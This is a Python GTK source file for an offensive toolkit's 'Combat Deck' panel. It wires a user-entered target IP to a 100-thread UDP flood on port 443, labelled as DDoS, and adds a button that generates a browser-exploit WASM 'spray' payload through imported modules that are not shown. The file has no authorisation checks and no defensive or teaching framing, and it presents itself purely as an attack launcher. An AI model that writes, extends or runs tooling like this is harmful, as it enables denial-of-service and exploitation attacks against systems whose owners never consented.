"""
ShadowCypher Combat Deck — High-Tier Arsenal Control Plane.
Dedicated UI for launching Chaos protocols, WASM Forge payloads, and Spectral Blocking.
"""

import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GLib, Pango
import time
from shadowcypher.ui.components import TacticalTerminal, DataPod, TacticalHeader
from shadowcypher.modules.chaos import chaos
from shadowcypher.modules.web_exploit_v2 import forge

class CombatDeck(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=0)
        self._build_ui()

    def _build_ui(self):
        # Header
        self.pack_start(TacticalHeader("COMBAT_DECK_APEX_2026", "ARSENAL_STATUS: ARMED"), False, False, 0)

        # Main Content
        hbox = Gtk.Box(spacing=15)
        hbox.set_margin_start(15)
        hbox.set_margin_end(15)
        hbox.set_margin_top(15)

        # 1. Left: Control Matrix
        control_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=15)
        control_vbox.set_size_request(300, -1)

        # --- CHAOS / DDoS SECTION ---
        chaos_pod = DataPod("CHAOS_ENGINE (ShadowStream)")
        c_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        
        self.target_entry = Gtk.Entry(placeholder_text="Target IP / Host")
        c_vbox.pack_start(self.target_entry, False, False, 0)
        
        type_combo = Gtk.ComboBoxText()
        type_combo.append("udp", "UDP_FLUX (2026)")
        type_combo.append("http", "HTTP_STRESS")
        type_combo.set_active(0)
        c_vbox.pack_start(type_combo, False, False, 0)
        
        self.chaos_btn = Gtk.Button(label="INITIATE_CHAOS")
        self.chaos_btn.get_style_context().add_class("destructive-action")
        self.chaos_btn.connect("clicked", self._on_chaos_click)
        c_vbox.pack_start(self.chaos_btn, False, False, 0)
        
        chaos_pod.content_area.add(c_vbox)
        control_vbox.pack_start(chaos_pod, False, False, 0)

        # --- WEBFORGE / WASM SECTION ---
        forge_pod = DataPod("WEBFORGE_V2 (Browser-Exploit)")
        f_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        
        self.wasm_btn = Gtk.Button(label="GENERATE_WASM_HARNESS")
        self.wasm_btn.get_style_context().add_class("suggested-action")
        self.wasm_btn.connect("clicked", self._on_forge_click)
        f_vbox.pack_start(self.wasm_btn, False, False, 0)
        
        forge_pod.content_area.add(f_vbox)
        control_vbox.pack_start(forge_pod, False, False, 0)

        hbox.pack_start(control_vbox, False, False, 0)

        # 2. Right: Live Execution Log
        self.terminal = TacticalTerminal(height=600)
        hbox.pack_start(self.terminal, True, True, 0)

        self.pack_start(hbox, True, True, 0)

    def _on_chaos_click(self, btn):
        target = self.target_entry.get_text().strip()
        if not target: return
        
        self.terminal.write(f"\u26a0 [CHAOS] Initiating UDP_FLUX load on {target}...\n", "red")
        chaos.start_udp_flood(target, 443, duration=30, threads=100)
        
    def _on_forge_click(self, btn):
        harness = forge.generate_html_harness("wasm_spray")
        self.terminal.write(f"\u2699 [FORGE] WASM Payload Generated: {harness}\n", "cyan")

    def show(self):
        self.show_all()
